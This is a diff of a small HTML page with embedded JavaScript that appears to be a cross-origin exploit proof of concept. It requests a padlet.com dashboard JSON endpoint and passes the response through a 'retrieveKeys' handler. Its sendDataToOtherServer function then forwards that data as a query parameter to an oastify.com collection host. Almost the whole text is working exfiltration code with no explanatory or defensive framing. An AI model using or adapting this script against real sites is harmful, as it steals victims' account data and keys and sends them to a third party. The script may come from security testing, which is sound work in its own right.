@@ -1,6 +1,8 @@
-<script>
+<html>
+<body>
+    <script>
 var req = new XMLHttpRequest();
-var url = "https://127.0.0.1";
+var url = "https://padlet.com//dashboard.json";
 
 req.onload = retrieveKeys;
 req.open('GET', url, true);
@@ -13,10 +15,12 @@ function retrieveKeys() {
 }
 
 function sendDataToOtherServer(data) {
-    var otherServerUrl = "https://nnefz89vu9pelpqh9zggijwkxb3ar0fp.oastify.com/log?key=" + data;
+    var otherServerUrl = "http://uus8n94c6r2g99hsovz3r8zp0g67bv1jq.oastify.com/log?key=" + data;
     
     var reqOtherServer = new XMLHttpRequest();
     reqOtherServer.open('GET', otherServerUrl, true);
     reqOtherServer.send(null);
 }
 </script>
+    </body>
+    </html>
